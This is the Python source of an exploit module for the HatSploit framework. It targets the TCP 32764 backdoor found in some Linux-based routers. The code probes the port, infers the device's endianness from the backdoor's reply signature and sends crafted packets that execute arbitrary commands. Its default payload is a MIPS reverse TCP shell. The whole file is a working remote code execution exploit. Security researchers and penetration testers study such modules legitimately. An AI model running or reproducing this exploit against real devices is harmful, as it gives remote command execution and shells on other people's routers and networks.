"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import struct

from hatsploit.lib.module.basic import *
from hatsploit.lib.module.proto import TCP


class HatSploitModule(Module, Handler, TCP):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Category': "exploit",
            'Name': "TCP 32764 Backdoor Remote Code Execution",
            'Module': "exploit/linux/generic/32764_code_execution",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Remote code execution in multiple devices through TCP 32764 backdoor.",
            'Platform': "linux",
            'Rank': "high",
            'Payload': {
                'Value': "linux/mipsbe/shell_reverse_tcp",
                'Architectures': ['mipsle', 'mipsbe', 'generic'],
                'Platforms': ['linux', 'unix'],
            }
        })

        self.port.visible = False
        self.port.set(32764)

        self.commands = {
            'get_endian': {
                'Description': "Get target device endian.",
                'Usage': "get_endian",
                'MinArgs': 0,
            }
        }

    def detect_endian(self):
        client = self.open_tcp()
        client.connect()

        client.send(b"abcde")
        response = client.recv(0xC)
        client.disconnect()

        if len(response) < 12:
            return None

        sig, ret_val, ret_len = struct.unpack('<III', response)
        if sig == 0x53634D4D:
            return '<'
        if sig == 0x4D4D6353:
            return '>'
        return None

    def get_endian(self, argc, argv):
        self.print_process("Detecting endian...")

        endian = self.detect_endian()

        if endian == '<':
            self.print_information("Endian detected: little")
        elif endian == '>':
            self.print_information("Endian detected: big")
        else:
            self.print_error("Failed to detect endian!")

    def exploit(self, command):
        endian = self.detect_endian()

        if endian is None:
            return

        headers = struct.pack(
            endian + 'III', 0x53634D4D, 0x07, len(command.encode()) + 1
        )
        trigger = headers + command.encode() + b'\x00'

        client = self.open_tcp()
        client.connect()

        client.send(trigger)
        response = client.recv(0xC)

        if len(response) < 12:
            client.disconnect()
            return ''

        sig, ret_val, ret_len = struct.unpack(endian + 'III', response)
        response = client.recv(ret_len)
        client.disconnect()

        return response.decode()

    def check(self):
        return self.is_on()

    def run(self):
        self.module_handle(
            method="bash_echo",
            concat="&&",
            sender=self.exploit,
        )
